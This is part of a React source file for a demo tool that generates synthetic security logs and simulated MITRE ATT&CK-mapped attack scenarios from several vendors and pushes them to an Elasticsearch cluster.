            <Button size="sm" variant="outline" onClick={()=>navigator.clipboard.writeText(events.map(e=>e.log).join('\n'))}>📋 Copy</Button>
            <Button size="sm" variant="outline" onClick={dl}>⬇ NDJSON</Button>
            {elasticConfig?.url&&<><Button size="sm" variant="outline" onClick={()=>setShowCurl(!showCurl)}>$ curl</Button><Button size="sm" onClick={push} disabled={pushing}>{pushing?'Pushing…':'⬆ Push to ES'}</Button></>}
          </div>
        </div>
        {showCurl&&curl&&<pre className="mt-3 bg-gray-950 rounded-lg p-3 text-xs font-mono text-gray-300 whitespace-pre-wrap">{curl}</pre>}
      </div>
      <div className="p-4 space-y-2 max-h-[550px] overflow-y-auto">
        {events.map((ev,i)=>{
          const pretty=()=>{try{return JSON.stringify(JSON.parse(ev.log),null,2);}catch{return ev.log;}};
          return(
            <div key={i} className={cn("border-l-2 bg-gray-800/40 rounded-r-lg overflow-hidden",SCOLOR[ev.severity])}>
              <div className="flex items-start gap-3 p-3 cursor-pointer hover:bg-gray-700/30 transition-colors" onClick={()=>toggle(i)}>
                <div className="flex items-center gap-2 shrink-0 pt-0.5">
                  <span className="text-[10px] font-mono text-gray-500 w-4 text-right">{ev.step}</span>
                  <div className={cn("w-2 h-2 rounded-full",SDOT[ev.severity])}/>
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 flex-wrap mb-0.5">
                    <span className={cn("text-xs font-medium",SRCCOLOR[ev.source]||'text-gray-400')}>{ev.source}</span>
                    <span className="text-[10px] text-gray-500 font-mono">{ev.tactic} • {ev.technique}</span>
                  </div>
                  <p className="text-xs text-gray-200 leading-relaxed">{ev.description}</p>
                  <p className="text-[10px] text-gray-500 mt-0.5 font-mono">{ev.timestamp.toLocaleTimeString()} — {ev.techniqueName}</p>
                </div>
                <span className="text-gray-500 text-xs">{expanded[i]?'▲':'▼'}</span>
              </div>
              {expanded[i]&&<pre className="text-[11px] p-3 pt-0 text-gray-400 whitespace-pre-wrap break-all border-t border-gray-700/50 bg-gray-950/50 font-mono">{pretty()}</pre>}
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ─── Main App ─────────────────────────────────────────────────────────────────
export default function App(){
  const [page,setPage]=useState('home');
  const [configOpen,setConfigOpen]=useState(false);
  const [elasticConfig,setElasticConfig]=useState(loadConfig);
  // Home state
  const [selected,setSelected]=useState([]);
  const [vendorRandomness,setVendorRandomness]=useState(VENDOR_RND_DEFAULT);
  const [vendorMinLogs,setVendorMinLogs]=useState(()=>
    Object.fromEntries(Object.entries(VENDOR_RND_DEFAULT).map(([id,lvl])=>[id,VENDOR_LOG_COUNT[id]?.[lvl]||50]))
  );
  const [maxLogs,setMaxLogs]=useState(500);
  const [timeRange,setTimeRange]=useState('60');
  const [logs,setLogs]=useState({});
  const [generating,setGenerating]=useState(false);
  const [pushing,setPushing]=useState(false);
  const [emailDomain,setEmailDomain]=useState('');
  const [windowsLogTypes,setWindowsLogTypes]=useState(WIN_TYPES_DEFAULT);
  const [linuxLogTypes,setLinuxLogTypes]=useState(LINUX_TYPES_DEFAULT);
  const [oracleLogTypes,setOracleLogTypes]=useState(ORACLE_TYPES_DEFAULT);
  const [mssqlLogTypes,setMSSQLLogTypes]=useState(MSSQL_TYPES_DEFAULT);
  const [cloudtrailLogTypes,setCloudtrailLogTypes]=useState(CT_TYPES_DEFAULT);
  const [oktaLogTypes,setOktaLogTypes]=useState(OKTA_TYPES_DEFAULT);
  const [crowdstrikeLogTypes,setCrowdstrikeLogTypes]=useState(CS_TYPES_DEFAULT);
  const [wdnsLogTypes,setWdnsLogTypes]=useState(WDNS_TYPES_DEFAULT);
  const [vendorHostnamePrefix,setVendorHostnamePrefix]=useState({windows:'',linux:'',endpoint:''});
  const [vendorHostnameCap,setVendorHostnameCap]=useState({windows:null,linux:null,endpoint:null});
  const [vendorIncludeAdmin,setVendorIncludeAdmin]=useState({endpoint:false,windows:false,linux:false});
  const [vendorIndexOverride,setVendorIndexOverride]=useState({});
  // Scenarios state
  const [activeScenario,setActiveScenario]=useState(null);
  const [scenarioEvents,setScenarioEvents]=useState([]);
  const [aptScenarioData,setAptScenarioData]=useState(null);

  // Keep maxLogs >= sum of selected minimums
  useEffect(()=>{
    if(!selected.length)return;
    const sum=selected.reduce((s,vid)=>s+(vendorMinLogs[vid]||50),0);
    setMaxLogs(prev=>Math.max(prev,sum));
  },[selected,vendorMinLogs]);

  const toggleVendor=useCallback(id=>setSelected(p=>p.includes(id)?p.filter(v=>v!==id):[...p,id]),[]);
  const handleRandomness=useCallback((id,lvl)=>{
    setVendorRandomness(p=>({...p,[id]:lvl}));
    if(id==='windows'){
      setWindowsLogTypes(types=>{
        const sum=types.reduce((s,t)=>s+(WIN_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
        setVendorMinLogs(p=>({...p,windows:Math.max(1,sum)}));
        return types;
      });
    } else if(id==='linux'){
      setLinuxLogTypes(types=>{
        const sum=types.reduce((s,t)=>s+(LINUX_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
        setVendorMinLogs(p=>({...p,linux:Math.max(1,sum)}));
        return types;
      });
    } else if(id==='oracle'){
      setOracleLogTypes(types=>{
        const sum=types.reduce((s,t)=>s+(ORACLE_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
        setVendorMinLogs(p=>({...p,oracle:Math.max(1,sum)}));
        return types;
      });
    } else if(id==='mssql'){
      setMSSQLLogTypes(types=>{
        const sum=types.reduce((s,t)=>s+(MSSQL_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
        setVendorMinLogs(p=>({...p,mssql:Math.max(1,sum)}));
        return types;
      });
    } else if(id==='cloudtrail'){
      setCloudtrailLogTypes(types=>{
        const sum=types.reduce((s,t)=>s+(CT_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
        setVendorMinLogs(p=>({...p,cloudtrail:Math.max(1,sum)}));
        return types;
      });
    } else if(id==='okta'){
      setOktaLogTypes(types=>{
        const sum=types.reduce((s,t)=>s+(OKTA_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
        setVendorMinLogs(p=>({...p,okta:Math.max(1,sum)}));
        return types;
      });
    } else if(id==='crowdstrike'){
      setCrowdstrikeLogTypes(types=>{
        const sum=types.reduce((s,t)=>s+(CS_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
        setVendorMinLogs(p=>({...p,crowdstrike:Math.max(1,sum)}));
        return types;
      });
    } else if(id==='wdns'){
      setWdnsLogTypes(types=>{
        const sum=types.reduce((s,t)=>s+(WDNS_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
        setVendorMinLogs(p=>({...p,wdns:Math.max(1,sum)}));
        return types;
      });
    } else {
      const def=VENDOR_LOG_COUNT[id]?.[lvl];
      if(def)setVendorMinLogs(p=>({...p,[id]:def}));
    }
  },[]);
  const handleWindowsLogTypes=useCallback((types)=>{
    setWindowsLogTypes(types);
    setVendorRandomness(prev=>{
      const lvl=prev.windows||'med';
      const sum=types.reduce((s,t)=>s+(WIN_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
      setVendorMinLogs(p=>({...p,windows:Math.max(1,sum)}));
      return prev;
    });
  },[]);
  const handleLinuxLogTypes=useCallback((types)=>{
    setLinuxLogTypes(types);
    setVendorRandomness(prev=>{
      const lvl=prev.linux||'med';
      const sum=types.reduce((s,t)=>s+(LINUX_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
      setVendorMinLogs(p=>({...p,linux:Math.max(1,sum)}));
      return prev;
    });
  },[]);
  const handleOracleLogTypes=useCallback((types)=>{
    setOracleLogTypes(types);
    setVendorRandomness(prev=>{
      const lvl=prev.oracle||'med';
      const sum=types.reduce((s,t)=>s+(ORACLE_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
      setVendorMinLogs(p=>({...p,oracle:Math.max(1,sum)}));
      return prev;
    });
  },[]);
  const handleMSSQLLogTypes=useCallback((types)=>{
    setMSSQLLogTypes(types);
    setVendorRandomness(prev=>{
      const lvl=prev.mssql||'med';
      const sum=types.reduce((s,t)=>s+(MSSQL_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
      setVendorMinLogs(p=>({...p,mssql:Math.max(1,sum)}));
      return prev;
    });
  },[]);
  const handleCloudtrailLogTypes=useCallback((types)=>{
    setCloudtrailLogTypes(types);
    setVendorRandomness(prev=>{
      const lvl=prev.cloudtrail||'med';
      const sum=types.reduce((s,t)=>s+(CT_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
      setVendorMinLogs(p=>({...p,cloudtrail:Math.max(1,sum)}));
      return prev;
    });
  },[]);
  const handleOktaLogTypes=useCallback((types)=>{
    setOktaLogTypes(types);
    setVendorRandomness(prev=>{
      const lvl=prev.okta||'med';
      const sum=types.reduce((s,t)=>s+(OKTA_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
      setVendorMinLogs(p=>({...p,okta:Math.max(1,sum)}));
      return prev;
    });
  },[]);
  const handleCrowdstrikeLogTypes=useCallback((types)=>{
    setCrowdstrikeLogTypes(types);
    setVendorRandomness(prev=>{
      const lvl=prev.crowdstrike||'med';
      const sum=types.reduce((s,t)=>s+(CS_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
      setVendorMinLogs(p=>({...p,crowdstrike:Math.max(1,sum)}));
      return prev;
    });
  },[]);
  const handleWdnsLogTypes=useCallback((types)=>{
    setWdnsLogTypes(types);
    setVendorRandomness(prev=>{
      const lvl=prev.wdns||'med';
      const sum=types.reduce((s,t)=>s+(WDNS_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
      setVendorMinLogs(p=>({...p,wdns:Math.max(1,sum)}));
      return prev;
    });
  },[]);
  const handleMinLogs=useCallback((id,val)=>{
    const n=Math.max(1,parseInt(val)||1);
    setVendorMinLogs(p=>({...p,[id]:n}));
  },[]);
  const handleHostnamePrefix=useCallback((id,val)=>setVendorHostnamePrefix(p=>({...p,[id]:val})),[]);
  const handleHostnameCap=useCallback((id,val)=>setVendorHostnameCap(p=>({...p,[id]:val===''?null:Math.max(1,parseInt(val)||1)})),[]);
  const handleIncludeAdmin=useCallback((id,val)=>setVendorIncludeAdmin(p=>({...p,[id]:val})),[]);
  const handleIndexOverride=useCallback((id,val)=>setVendorIndexOverride(p=>({...p,[id]:val})),[]);
  const handleGenerate=useCallback(()=>{
    setGenerating(true);
    setTimeout(()=>{
      // Step 1: each vendor gets its minimum
      const vendorTotals={};
      selected.forEach(vid=>{vendorTotals[vid]=Math.max(1,vendorMinLogs[vid]||50);});
      const sumMins=Object.values(vendorTotals).reduce((s,n)=>s+n,0);
      // Step 2: distribute remaining capacity randomly across selected vendors
      const remaining=Math.max(0,maxLogs-sumMins);
      if(remaining>0&&selected.length>0){
        const weights=selected.map(()=>Math.random()+0.1);
        const totalW=weights.reduce((s,w)=>s+w,0);
        let assigned=0;
        selected.forEach((vid,i)=>{
          const share=i===selected.length-1?remaining-assigned:Math.round(weights[i]/totalW*remaining);
          vendorTotals[vid]+=share;assigned+=share;
        });
      }
      // Step 3: generate (seed attack correlations so DNS and firewall events share IPs)
      seedAttackCorrelations(8);
      const nl={};
      selected.forEach(vid=>{
        const v=VENDORS.find(x=>x.id===vid);if(!v)return;
        const lvl=vendorRandomness[vid]||'med';
        const prefix=['windows','linux','endpoint'].includes(vid)?(vendorHostnamePrefix[vid]?.trim()||null):null;
        _hostnamePrefix=prefix;
        const poolSize=vendorHostnameCap[vid]!=null?vendorHostnameCap[vid]:(VENDOR_POOL[vid]?.[lvl]??null);
        setPool(poolSize,prefix);
        _emailDomain=vid==='email'?(emailDomain.trim()||null):null;
        _includeAdminUsers=['endpoint','windows','linux'].includes(vid)?(vendorIncludeAdmin[vid]||false):false;
        nl[v.id]=vid==='windows'?generateWindowsEventLogs(vendorTotals[vid],parseInt(timeRange),windowsLogTypes):vid==='linux'?generateLinuxLogs(vendorTotals[vid],parseInt(timeRange),linuxLogTypes):vid==='oracle'?generateOracleLogs(vendorTotals[vid],parseInt(timeRange),oracleLogTypes):vid==='mssql'?generateMSSQLLogs(vendorTotals[vid],parseInt(timeRange),mssqlLogTypes):vid==='cloudtrail'?generateCloudTrailLogs(vendorTotals[vid],parseInt(timeRange),cloudtrailLogTypes):vid==='okta'?generateOktaLogs(vendorTotals[vid],parseInt(timeRange),oktaLogTypes):vid==='crowdstrike'?generateCrowdStrikeLogs(vendorTotals[vid],parseInt(timeRange),crowdstrikeLogTypes):vid==='wdns'?generateWDNSLogs(vendorTotals[vid],parseInt(timeRange),wdnsLogTypes):v.generator(vendorTotals[vid],parseInt(timeRange));
      });
      _emailDomain=null;
      _hostnamePrefix=null;
      _includeAdminUsers=false;
      setLogs(nl);setGenerating(false);
    },300);
  },[selected,vendorMinLogs,maxLogs,vendorRandomness,timeRange,emailDomain,windowsLogTypes,linuxLogTypes,oracleLogTypes,mssqlLogTypes,cloudtrailLogTypes,oktaLogTypes,crowdstrikeLogTypes,wdnsLogTypes]);

  const handlePush=useCallback(async()=>{
    setPushing(true);
    try{
      const{total,errors,indices,sampleErrors}=await pushLogsToElastic(logs,vendorIndexOverride);
      const idxList=Object.entries(indices).map(([idx,n])=>`${idx}(${n})`).join('\n');
      if(errors>0){const errDetail=sampleErrors?.slice(0,3).join('\n')||'';alert(`⚠ Pushed ${total-errors}/${total} logs. ${errors} errors.\n\nIndices:\n${idxList}\n\nSample errors:\n${errDetail}`);}
      else alert(`✓ Pushed ${total} logs across ${Object.keys(indices).length} indices\n${idxList}`);
    }catch(e){alert(`Error: ${e.message}`);}
    finally{setPushing(false);}
  },[logs,elasticConfig]);

  const handleScenario=s=>{
    setActiveScenario(s);
    if(s.type==='apt'){setAptScenarioData(s.generator());setScenarioEvents([]);}
    else{setScenarioEvents(s.generator());setAptScenarioData(null);}
  };
  const saveConfig=cfg=>{setElasticConfig(cfg);};

  const totalLogs=Object.values(logs).reduce((s,l)=>s+l.length,0);

  return(
    <div className="min-h-screen bg-gray-950 text-white" style={{fontFamily:'system-ui,sans-serif'}}>
      {/* Header */}
      <header className="border-b border-gray-800 bg-gray-900/80 backdrop-blur-sm sticky top-0 z-20">
        <div className="max-w-6xl mx-auto px-4 h-14 flex items-center justify-between gap-4">
          <div className="flex items-center gap-2.5">
            <div className="w-7 h-7 rounded-lg bg-blue-500/20 flex items-center justify-center">🛡</div>
            <span className="font-bold text-sm">Elastic <span className="text-blue-400">Demo Forge</span></span>
          </div>
          <nav className="flex gap-1">
            {[{id:'home',label:'Log Generator',icon:'🛡'},{id:'scenarios',label:'Attack Scenarios',icon:'🚨'}].map(({id,label,icon})=>(
              <button key={id} onClick={()=>setPage(id)} className={cn("flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition-colors",page===id?"text-blue-400 bg-blue-500/10":"text-gray-400 hover:text-white")}>
                <span>{icon}</span>{label}
              </button>
            ))}
          </nav>
          <button onClick={()=>setConfigOpen(true)} className={cn("flex items-center gap-1.5 px-3 py-1.5 rounded-lg border text-xs transition-colors",elasticConfig?.url?"border-blue-500/40 text-blue-400 hover:bg-blue-500/10":"border-gray-600 text-gray-400 hover:border-gray-400")}>
            🗄 {elasticConfig?.url?<><span className="max-w-[120px] truncate hidden sm:inline">{elasticConfig.url.replace(/^https?:\/\//,'')}</span><Badge className="border-blue-500/40 text-blue-400 bg-blue-500/10 ml-1 hidden sm:inline-flex">connected</Badge></>:'Connect ES'}
          </button>
        </div>
      </header>

      {/* Pages */}
      {page==='home'&&(
        <div className="min-h-screen">
          <div className="border-b border-gray-800 bg-gradient-to-b from-blue-500/5 to-transparent">
            <div className="max-w-6xl mx-auto px-4 py-8">
              <div className="flex flex-col sm:flex-row sm:items-end sm:justify-between gap-4">
                <div>
                  <div className="flex items-center gap-3 mb-2">
                    <div className="w-10 h-10 rounded-xl bg-blue-500/20 flex items-center justify-center text-xl">🛡</div>
                    <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">Log Generator</h1>
                  </div>
                  <p className="text-sm text-gray-400 max-w-lg">Generate realistic vendor log data for Elastic Security demos. Select sources, configure volume, and push to your cluster.</p>
                </div>
                {totalLogs>0&&(
                  <div className="flex items-center gap-3 flex-wrap">
                    {Object.entries(logs).map(([id,l],i)=>{
                      const colors=['bg-blue-500','bg-emerald-500','bg-orange-500','bg-purple-500','bg-yellow-500','bg-red-500','bg-pink-500'];
                      return(<div key={id} className="flex items-center gap-1.5"><div className={cn("w-2 h-2 rounded-full",colors[i%colors.length])}/><span className="text-xs text-gray-400">{VENDORS.find(v=>v.id===id)?.name.split(' ')[0]}: <span className="font-mono font-semibold text-white">{l.length}</span></span></div>);
                    })}
                    <span className="text-xs font-mono font-semibold text-blue-400">{totalLogs} total</span>
                  </div>
                )}
              </div>
            </div>
          </div>
          <div className="max-w-6xl mx-auto px-4 py-8">
            <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
              <div className="lg:col-span-3">
                <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4">Log Sources</h2>
                <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-3 gap-3">
                  {VENDORS.map(v=><VendorCard key={v.id} vendor={v} selected={selected.includes(v.id)} onToggle={toggleVendor} integrationMissing={false} randomness={vendorRandomness[v.id]} onRandomness={handleRandomness} minLogs={vendorMinLogs[v.id]||50} onMinLogs={handleMinLogs} emailDomain={emailDomain} onEmailDomain={setEmailDomain} windowsLogTypes={windowsLogTypes} onWindowsLogTypes={handleWindowsLogTypes} linuxLogTypes={linuxLogTypes} onLinuxLogTypes={handleLinuxLogTypes} oracleLogTypes={oracleLogTypes} onOracleLogTypes={handleOracleLogTypes} mssqlLogTypes={mssqlLogTypes} onMSSQLLogTypes={handleMSSQLLogTypes} cloudtrailLogTypes={cloudtrailLogTypes} onCloudtrailLogTypes={handleCloudtrailLogTypes} oktaLogTypes={oktaLogTypes} onOktaLogTypes={handleOktaLogTypes} crowdstrikeLogTypes={crowdstrikeLogTypes} onCrowdstrikeLogTypes={handleCrowdstrikeLogTypes} wdnsLogTypes={wdnsLogTypes} onWdnsLogTypes={handleWdnsLogTypes} hostnamePrefix={vendorHostnamePrefix[v.id]||''} onHostnamePrefix={handleHostnamePrefix} hostnameCap={vendorHostnameCap[v.id]??null} onHostnameCap={handleHostnameCap} includeAdmin={vendorIncludeAdmin[v.id]||false} onIncludeAdmin={handleIncludeAdmin} indexOverride={vendorIndexOverride[v.id]||''} onIndexOverride={handleIndexOverride}/>)}
                </div>
              </div>
              <div className="lg:col-span-1">
                <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4">Configuration</h2>
                <div className="sticky top-20 bg-gray-900 border border-gray-700 rounded-xl p-4 space-y-5">
                  <div className="space-y-2">
                    <div className="flex justify-between items-center">
                      <label className="text-xs text-gray-400">Max Total Logs</label>
                      <span className="text-sm font-mono font-semibold text-white">{maxLogs.toLocaleString()}</span>
                    </div>
                    <input type="number" min="1" max="100000" step="100" value={maxLogs} onChange={e=>setMaxLogs(Math.min(100000,Math.max(1,Number(e.target.value)||1)))} className="w-full bg-gray-800 border border-gray-600 rounded-lg px-3 py-2 text-sm font-mono text-gray-200 focus:outline-none focus:border-blue-500"/>
                    {(()=>{const sum=selected.reduce((s,vid)=>s+(vendorMinLogs[vid]||50),0);return(<div className="flex justify-between text-[10px] text-gray-500"><span>min guaranteed: <span className={sum>maxLogs?'text-amber-400 font-semibold':''}>{sum.toLocaleString()}</span></span><span>max 100,000</span></div>);})()}
                  </div>
                  <div className="space-y-1.5">
                    <label className="text-xs text-gray-400">Time Range</label>
                    <select value={timeRange} onChange={e=>setTimeRange(e.target.value)} className="w-full bg-gray-800 border border-gray-600 rounded-lg px-3 py-2 text-sm text-gray-200 focus:outline-none focus:border-blue-500">
                      {[['15','Last 15 minutes'],['60','Last 1 hour'],['360','Last 6 hours'],['1440','Last 24 hours'],['10080','Last 7 days']].map(([v,l])=><option key={v} value={v}>{l}</option>)}
                    </select>
                  </div>
                  <Button onClick={handleGenerate} disabled={selected.length===0||generating} className="w-full">
                    {generating?'⟳ Generating…':`⚡ Generate ${selected.length>0?`${selected.length} Source${selected.length>1?'s':''}`:''}`}
                  </Button>
                  {selected.length===0&&<p className="text-xs text-gray-500 text-center">Select at least one log source</p>}
                </div>
              </div>
            </div>
            {Object.keys(logs).length>0&&(
              <div className="mt-8 space-y-3">
                <div className="flex items-center justify-between">
                  <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider">Output</h2>
                  <Button size="sm" variant="outline" onClick={handlePush} disabled={pushing} className="border-blue-500/30 text-blue-400 hover:bg-blue-500/10">
                    {pushing?'⟳ Pushing…':'⬆ Push to Elasticsearch'}
                  </Button>
                </div>
                <LogViewer logs={logs} vendorLabels={Object.fromEntries(VENDORS.map(v=>[v.id,v.name]))}/>
              </div>
            )}
          </div>
        </div>
      )}

      {page==='scenarios'&&(
        <div className="min-h-screen">
          <div className="border-b border-gray-800 bg-gradient-to-b from-red-500/5 to-transparent">
            <div className="max-w-4xl mx-auto px-4 py-8">
              <div className="flex items-center gap-3 mb-2">
                <div className="w-10 h-10 rounded-xl bg-red-500/20 flex items-center justify-center text-xl">🚨</div>
                <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">Attack Scenarios</h1>
              </div>
              <p className="text-sm text-gray-400 max-w-lg">Generate correlated, multi-source attack scenarios with MITRE ATT&CK-mapped logs. Push directly to Elasticsearch.</p>
            </div>
          </div>
          <div className="max-w-4xl mx-auto px-4 py-8 space-y-8">
            {!elasticConfig?.url&&(
              <div className="flex items-start gap-3 p-4 rounded-xl bg-blue-500/5 border border-blue-500/20">
                <span className="text-blue-400 shrink-0 mt-0.5">ℹ</span>
                <p className="text-xs text-gray-400"><span className="text-blue-400 font-medium">Tip:</span> Configure your Elasticsearch connection (top-right) to enable direct push and curl commands.</p>
              </div>
            )}
            <div>
              <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4">Available Scenarios</h2>
              <div className="space-y-3">
                {SCENARIOS.map(s=>(
                  <div key={s.id} onClick={()=>handleScenario(s)} className={cn("p-5 rounded-xl border-2 cursor-pointer transition-all",activeScenario?.id===s.id?"border-red-500/50 bg-red-500/5":"border-gray-700 hover:border-gray-500 bg-gray-900/60")}>
                    <div className="flex items-start gap-4">
                      <div className="w-11 h-11 rounded-xl bg-red-500/15 flex items-center justify-center text-xl shrink-0">
                        {s.id==='phishing'?'🎣':s.id==='phishing-lateral'?'🌐':s.id==='exfiltration'?'💾':'💀'}
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 flex-wrap mb-1">
                          <h3 className="font-semibold text-sm text-white">{s.name}</h3>
                          <Badge className="border-red-500/40 text-red-400 bg-red-500/10">{s.severity}</Badge>
                        </div>
                        <p className="text-xs text-gray-400 mb-2.5 leading-relaxed">{s.description}</p>
                        <div className="flex flex-wrap gap-1.5">
                          {s.tactics.map(t=><Badge key={t} className="border-gray-600 text-gray-400">{t}</Badge>)}
                        </div>
                      </div>
                      <button onClick={e=>{e.stopPropagation();handleScenario(s);}} className="shrink-0 flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-500/10 hover:bg-red-500/20 border border-red-500/20 text-red-400 text-xs font-medium transition-colors">⚡ Run</button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
            {activeScenario&&aptScenarioData&&(
              <div>
                <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4">Scenario Output</h2>
                <APTScenarioViewer scenario={activeScenario} data={aptScenarioData} elasticConfig={elasticConfig}/>
              </div>
            )}
            {activeScenario&&scenarioEvents.length>0&&(
              <div>
                <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4">Scenario Output</h2>
                <ScenarioViewer scenario={activeScenario} events={scenarioEvents} elasticConfig={elasticConfig}/>
              </div>
            )}
          </div>
        </div>
      )}

      <ConfigDialog open={configOpen} onClose={()=>setConfigOpen(false)} onSave={saveConfig}/>
    </div>
  );
}